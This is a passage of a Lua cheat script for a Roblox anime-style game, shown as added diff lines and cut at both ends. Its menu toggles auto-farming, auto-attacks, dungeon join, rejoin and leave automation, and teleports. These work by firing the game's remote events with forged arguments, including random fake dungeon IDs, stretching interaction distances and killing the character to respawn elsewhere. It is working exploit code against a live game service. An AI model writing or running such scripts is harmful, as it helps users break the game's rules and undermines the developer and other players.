+                        game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+                    end
+                end
+            end)
+        end
+    end
+end)
+--]]
+local AttackMode = Tabs.AutoFarm:AddDropdown("Attack Mode", {
+    Title = "Attack Mode",
+    Description = "",
+    Values = {"Fast", "Normal"},
+    Multi = false,
+    Default = getgenv().Config["Attack Mode"] or "N/A",
+})
+AttackMode:OnChanged(function(Value)
+    _G['Attack Mode'] = Value
+    getgenv().Config["Attack Mode"] = Value
+    Update_Setting(getgenv()['MyName'])
+end)
+Tabs.AutoFarm:AddToggle("Auto Send Pet Attack", {
+    Title = "Auto Send Pet Attack",
+    Description = "",
+    Default = getgenv().Config["Auto Send Pet Attack"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Send Pet Attack"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+local checkcccccc
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Send Pet Attack"] and _G['Attack Mode'] == "Normal" then
+            pcall(function()
+                for i, v in pairs(game:GetService("Players").LocalPlayer.leaderstats.Inventory.Pets:GetChildren()) do
+                    for i, v2 in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                        if (v2.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                            checkcccccc = 0
+                            if v2.HealthBar.Enabled == true and checkcccccc == 0 then
+                                repeat
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\7"
+                                        }
+                                    }
+
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\7"
+                                        }
+                                    }
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\5"
+                                        }
+                                    }
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\n"
+                                        }
+                                    }
+
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\t"
+                                        }
+                                    }
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    checkcccccc = 1
+                                    wait(2)
+                                until not getgenv().Config["Auto Send Pet Attack"] or v2.HealthBar.Enabled == false or checkcccccc == 0
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+local checkcccccc
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Send Pet Attack"] and _G['Attack Mode'] == "Fast" then
+            pcall(function()
+                for i, v in pairs(game:GetService("Players").LocalPlayer.leaderstats.Inventory.Pets:GetChildren()) do
+                    for i, v2 in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                        if (v2.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                            checkcccccc = 0
+                            if v2.HealthBar.Enabled == true and checkcccccc == 0 then
+                                repeat
+                                    wait(0.25)
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\7"
+                                        }
+                                    }
+
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\7"
+                                        }
+                                    }
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\5"
+                                        }
+                                    }
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\n"
+                                        }
+                                    }
+
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    local args = {
+                                        [1] = {
+                                            [1] = {
+                                                ["PetPos"] = {
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                    [v.Name] = v2.HumanoidRootPart.Position,
+                                                },
+                                                ["AttackType"] = "All",
+                                                ["Event"] = "Attack",
+                                                ["Enemy"] = v2.Name
+                                            },
+                                            [2] = "\t"
+                                        }
+                                    }
+                                    game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                        "dataRemoteEvent"):FireServer(unpack(args))
+                                    checkcccccc = 1
+                                until not getgenv().Config["Auto Send Pet Attack"] or v2.HealthBar.Enabled == false or checkcccccc == 0
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.AutoFarm:AddToggle("Auto Punch", {
+    Title = "Auto Punch",
+    Description = "",
+    Default = getgenv().Config["Auto Punch"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Punch"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Punch"] then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                        local args = {
+                            [1] = {
+                                [1] = {
+                                    ["Event"] = "PunchAttack",
+                                    ["Enemy"] = v.Name
+                                },
+                                [2] = "\4"
+                            }
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                            "dataRemoteEvent"):FireServer(unpack(args))
+                        for i, v in pairs(game.workspace.__Main.__Enemies.Server["1"]:GetChildren()) do
+                            if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                                local args = {
+                                    [1] = {
+                                        [1] = {
+                                            ["Event"] = "PunchAttack",
+                                            ["Enemy"] = v.Name
+                                        },
+                                        [2] = "\4"
+                                    }
+                                }
+                                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                    "dataRemoteEvent"):FireServer(unpack(args))
+                            end
+                        end
+                        for i, v in pairs(game.workspace.__Main.__Enemies.Server["2"]:GetChildren()) do
+                            if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                                local args = {
+                                    [1] = {
+                                        [1] = {
+                                            ["Event"] = "PunchAttack",
+                                            ["Enemy"] = v.Name
+                                        },
+                                        [2] = "\4"
+                                    }
+                                }
+                                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                    "dataRemoteEvent"):FireServer(unpack(args))
+                            end
+                        end
+                        for i, v in pairs(game.workspace.__Main.__Enemies.Server["3"]:GetChildren()) do
+                            if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                                local args = {
+                                    [1] = {
+                                        [1] = {
+                                            ["Event"] = "PunchAttack",
+                                            ["Enemy"] = v.Name
+                                        },
+                                        [2] = "\4"
+                                    }
+                                }
+                                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                    "dataRemoteEvent"):FireServer(unpack(args))
+                            end
+                        end
+                        for i, v in pairs(game.workspace.__Main.__Enemies.Server["4"]:GetChildren()) do
+                            if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                                local args = {
+                                    [1] = {
+                                        [1] = {
+                                            ["Event"] = "PunchAttack",
+                                            ["Enemy"] = v.Name
+                                        },
+                                        [2] = "\4"
+                                    }
+                                }
+                                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                    "dataRemoteEvent"):FireServer(unpack(args))
+                            end
+                        end
+                        for i, v in pairs(game.workspace.__Main.__Enemies.Server["5"]:GetChildren()) do
+                            if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
+                                local args = {
+                                    [1] = {
+                                        [1] = {
+                                            ["Event"] = "PunchAttack",
+                                            ["Enemy"] = v.Name
+                                        },
+                                        [2] = "\4"
+                                    }
+                                }
+                                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild(
+                                    "dataRemoteEvent"):FireServer(unpack(args))
+                                local Players = game:GetService("Players")
+
+                                local player = Players.LocalPlayer
+                                local character = player.Character or player.CharacterAdded:Wait()
+                                local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+                                -- ค้นหา Animator
+                                local animator = humanoid:FindFirstChildOfClass("Animator") or
+                                    humanoid:WaitForChild("Animator")
+                                -- ลบแอนิเมชันเก่าทันที
+                                for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+                                    track:Stop(0) -- ใส่ค่า 0 เพื่อลบแอนิเมชันทันที
+                                end
+                                -- โหลดแอนิเมชันท่ายืนใหม่
+                                local animation = Instance.new("Animation")
+                                animation.AnimationId = "rbxassetid://101376733240639" -- เปลี่ยนเป็นไอดีที่ต้องการ
+
+                                local animationTrack = animator:LoadAnimation(animation)
+                                animationTrack.Looped = true -- ทำให้เล่นซ้ำ
+                                animationTrack.Priority = Enum.AnimationPriority
+                                    .Action -- ตั้งค่าให้เล่นก่อนแอนิเมชันอื่น
+                                animationTrack:Play(0) -- ใส่ 0 เพื่อให้เล่นทันทีโดยไม่มีดีเลย์
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.Dungeons:AddSection("Dungeons")
+Tabs.Dungeons:AddToggle("Auto Farm Dungeon", {
+    Title = "Auto Farm Dungeon",
+    Description = "",
+    Default = getgenv().Config["Auto Farm Dungeon"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Farm Dungeon"] = Value
+        Update_Setting(getgenv()['MyName'])
+        StopTween(getgenv().Config["Auto Farm Dungeon"])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Dungeon"] and game.PlaceId == 128336380114944 then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999999 then
+                            if v.HealthBar.Enabled == true or v.HealthBar.Enabled == false then
+                                repeat
+                                    wait()
+                                    TP(v.HumanoidRootPart.CFrame * pos)
+                                until not getgenv().Config["Auto Farm Dungeon"] or v.HealthBar.Enabled == false
+                                StopTween(getgenv().Config["Auto Farm Dungeon"])
+                                wait(0.4)
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local player = Players.LocalPlayer
+local dungeonFolder = Workspace:WaitForChild("__Main"):WaitForChild("__Dungeon")
+function createDungeon()
+    local args1 = {
+        [1] = {
+            [1] = { ["Event"] = "DungeonAction", ["Action"] = "Create" },
+            [2] = "\n"
+        }
+    }
+    ReplicatedStorage:WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args1))
+
+    local args2 = {
+        [1] = {
+            [1] = { ["Event"] = "DungeonAction", ["Action"] = "Create" },
+            [2] = "\t"
+        }
+    }
+    ReplicatedStorage:WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args2))
+end
+function startDungeon()
+    local fakeID = tostring(math.random(100000, 999999))
+    local args1 = {
+        [1] = {
+            [1] = { ["Dungeon"] = fakeID, ["Event"] = "DungeonAction", ["Action"] = "Start" },
+            [2] = "\n"
+        }
+    }
+    ReplicatedStorage:WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args1))
+    local args2 = {
+        [1] = {
+            [1] = { ["Dungeon"] = fakeID, ["Event"] = "DungeonAction", ["Action"] = "Start" },
+            [2] = "\t"
+        }
+    }
+    ReplicatedStorage:WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args2))
+end
+function autoStartDungeon()
+    while getgenv().Config["Auto Join Dungeon"] do
+        createDungeon()
+        task.wait(0.5)
+        startDungeon()
+        task.wait(3)
+    end
+end
+Tabs.Dungeons:AddToggle("Auto Join Dungeon", {
+    Title = "Auto Join Dungeon",
+    Description = "",
+    Default = getgenv().Config["Auto Join Dungeon"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Join Dungeon"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while task.wait(1) do
+        if getgenv().Config["Auto Join Dungeon"] and game.PlaceId ~= 128336380114944 then
+            pcall(autoStartDungeon)
+        end
+    end
+end)
+Tabs.Dungeons:AddToggle("Auto Rejoin Dungeon", {
+    Title = "Auto Rejoin Dungeon",
+    Description = "",
+    Default = getgenv().Config["Auto Rejoin Dungeon"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Rejoin Dungeon"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while task.wait() do
+        if getgenv().Config["Auto Rejoin Dungeon"] and game.PlaceId ~= 128336380114944 then
+            pcall(function()
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Type"] = "Gems",
+                            ["Event"] = "DungeonAction",
+                            ["Action"] = "BuyTicket"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Type"] = "Gems",
+                            ["Event"] = "DungeonAction",
+                            ["Action"] = "BuyTicket"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+                startDungeon()
+            end)
+        end
+    end
+end)
+Tabs.Dungeons:AddSection("lnfernal Castle")
+Tabs.Dungeons:AddSlider("Choose Room",
+    {
+        Title = "Choose Room",
+        Description = "",
+        Default = getgenv().Config["Choose Room"] or 25,
+        Min = 1,
+        Max = 100,
+        Rounding = 0,
+        Callback = function(Value)
+            getgenv().Config["Choose Room"] = Value
+            Update_Setting(getgenv()['MyName'])
+        end
+    })
+Tabs.Dungeons:AddToggle("Auto Farm lnfernal Castle", {
+    Title = "Auto Farm lnfernal Castle",
+    Description = "",
+    Default = getgenv().Config["Auto Farm lnfernal Castle"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Farm lnfernal Castle"] = Value
+        Update_Setting(getgenv()['MyName'])
+        StopTween(getgenv().Config["Auto Farm lnfernal Castle"])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm lnfernal Castle"] and game.PlaceId == 128336380114944 then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999 then
+                        repeat
+                            wait()
+                            TP(v.HumanoidRootPart.CFrame * pos)
+                        until not getgenv().Config["Auto Farm lnfernal Castle"] or v.HealthBar.Enabled == false
+                        StopTween(getgenv().Config["Auto Farm lnfernal Castle"])
+                        wait(0.4)
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm lnfernal Castle"] then
+            pcall(function()
+                for i,v in pairs(game.workspace.__Main.__World:GetDescendants()) do
+                    if v.Name == "ProximityPrompt" then
+                        fireproximityprompt(v, 100000)
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.Dungeons:AddToggle("Auto Join lnfernal Castle", {
+    Title = "Auto Join lnfernal Castle",
+    Description = "",
+    Default = getgenv().Config["Auto Join lnfernal Castle"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Join lnfernal Castle"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Join lnfernal Castle"] and game.PlaceId ~= 128336380114944 then
+            pcall(function()
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "JoinCastle"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "JoinCastle"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+            end)
+        end
+    end
+end)
+Tabs.Dungeons:AddToggle("Auto Leave", {
+    Title = "Auto Leave",
+    Description = "",
+    Default = getgenv().Config["Auto Leave"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Leave"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Leave"] and game.PlaceId == 128336380114944 then
+            pcall(function()
+                for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Hud.UpContanier:GetChildren()) do
+                    if v.Name == "Room" then
+                        if v.Text == "Floor: " .. getgenv().Config["Choose Room"] .. "/100" then
+                            game:GetService("TeleportService"):Teleport(87039211657390, game:GetService("Players").LocalPlayer)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.Dungeons:AddSection("Settings")
+Tabs.Dungeons:AddToggle("Auto Destroy Dungeon", {
+    Title = "Auto Destroy Dungeon",
+    Description = "",
+    Default = getgenv().Config["Auto Destroy Dungeon"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Destroy Dungeon"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Destroy Dungeon"] and game.PlaceId == 128336380114944 then
+            pcall(function()
+                for i, v in ipairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") then
+                        local rootPart = v:FindFirstChild("HumanoidRootPart")
+                        local DestroyPrompt = rootPart and rootPart:FindFirstChild("DestroyPrompt")
+                        if DestroyPrompt then
+                            DestroyPrompt:SetAttribute("MaxActivationDistance", 100000)
+                            fireproximityprompt(DestroyPrompt)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.Dungeons:AddToggle("Auto Arise Dungeon", {
+    Title = "Auto Arise Dungeon",
+    Description = "",
+    Default = getgenv().Config["Auto Arise Dungeon"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Arise Dungeon"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Arise Dungeon"] and game.PlaceId == 128336380114944 then
+            pcall(function()
+                for i, v in ipairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") then
+                        local rootPart = v:FindFirstChild("HumanoidRootPart")
+                        local DestroyPrompt = rootPart and rootPart:FindFirstChild("ArisePrompt")
+                        if DestroyPrompt then
+                            DestroyPrompt:SetAttribute("MaxActivationDistance", 100000)
+                            fireproximityprompt(DestroyPrompt)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.Teleport:AddButton({
+    Title = "Teleport to Solo World",
+    Description = "",
+    Callback = function()
+        pcall(function()
+            local possw = CFrame.new(577.961914, 28.434576, 261.457123, 1, 2.59595481e-07, 7.27989835e-10,
+                -2.59595481e-07, 1, 2.59595424e-07, -7.27922445e-10, -2.59595424e-07, 1)
+            if (possw.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1500 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(577.961914, 28.434576,
+                    261.457123, 1, 2.59595481e-07, 7.27989835e-10, -2.59595481e-07, 1, 2.59595424e-07,
+                    -7.27922445e-10, -2.59595424e-07, 1)
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "SoloWorld"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "SoloWorld"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                game.Players.LocalPlayer.Character.Head:Destroy()
+            else
+                TP(possw)
+            end
+        end)
+    end
+})
+Tabs.Teleport:AddButton({
+    Title = "Teleport to Naruto World",
+    Description = "",
+    Callback = function()
+        pcall(function()
+            local possw = CFrame.new(-3380.23608, 30.2604809, 2257.25879, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+            if (possw.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1500 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3380.23608, 30.2604809,
+                    2257.25879, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "NarutoWorld"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "NarutoWorld"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                game.Players.LocalPlayer.Character.Head:Destroy()
+            else
+                TP(possw)
+            end
+        end)
+    end
+})
+Tabs.Teleport:AddButton({
+    Title = "Teleport to OP World",
+    Description = "",
+    Callback = function()
+        pcall(function()
+            local possw = CFrame.new(-2851.12256, 49.3989372, -2011.39355, 0.740045071, 0, 0.672557294, 0, 1, 0,
+                -0.672557294, 0, 0.740045071)
+            if (possw.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1500 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2851.12256, 49.3989372,
+                    -2011.39355, 0.740045071, 0, 0.672557294, 0, 1, 0, -0.672557294, 0, 0.740045071)
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "OPWorld"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "OPWorld"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                game.Players.LocalPlayer.Character.Head:Destroy()
+            else
+                TP(possw)
+            end
+        end)
+    end
+})
+Tabs.Teleport:AddButton({
+    Title = "Teleport to Bleach World",
+    Description = "",
+    Callback = function()
+        pcall(function()
+            local possw = CFrame.new(2641.79614, 45.4265251, -2645.07544, 0.780932724, 0, -0.624615133, 0, 1, 0,
+                0.624615133, 0, 0.780932724)
+            if (possw.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1500 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2641.79614, 45.4265251,
+                    -2645.07544, 0.780932724, 0, -0.624615133, 0, 1, 0, 0.624615133, 0, 0.780932724)
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "BleachWorld"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "BleachWorld"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                game.Players.LocalPlayer.Character.Head:Destroy()
+            else
+                TP(possw)
+            end
+        end)
+    end
+})
+Tabs.Teleport:AddButton({
+    Title = "Teleport to BC World",
+    Description = "",
+    Callback = function()
+        pcall(function()
+            local possw = CFrame.new(198.339813, 38.7076759, 4296.1123, 0.993158996, 6.24933818e-07, -0.116769925,
+                -5.63039464e-07, 1, 5.63039464e-07, 0.116769925, -4.93441632e-07, 0.993158996)
+            if (possw.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1500 then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(198.339813, 38.7076759,
+                    4296.1123, 0.993158996, 6.24933818e-07, -0.116769925, -5.63039464e-07, 1, 5.63039464e-07,
+                    0.116769925, -4.93441632e-07, 0.993158996)
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "ChangeSpawn",
+                            ["Spawn"] = "BCWorld"
+                        },
